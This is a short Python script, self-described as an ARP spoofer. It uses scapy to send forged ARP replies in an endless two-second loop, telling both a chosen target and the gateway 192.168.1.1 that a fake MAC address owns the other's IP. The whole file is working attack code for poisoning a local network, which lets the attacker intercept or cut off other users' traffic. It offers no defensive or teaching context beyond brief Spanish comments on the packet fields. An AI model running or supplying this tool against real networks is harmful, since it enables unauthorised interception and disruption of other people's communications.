#!/usr/bin/env python3

import argparse
import scapy.all as scapy
import time

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP spoofer")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP range to spoof")
    
    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip,pdst=ip_address, hwsrc="aa:bb:cc:44:55:66")  #2=respuesta 1=peticion, psrc=protocolSource, pdest= protocolDestination hwrc= nueva mac
    scapy.send(arp_packet, verbose=False)

def main():
    arguments = get_arguments()
    while True:
        
        spoof(arguments.ip_address, "192.168.1.1")
        spoof("192.168.1.1", arguments.ip_address)
        time.sleep(2)

if __name__ == '__main__':
    main()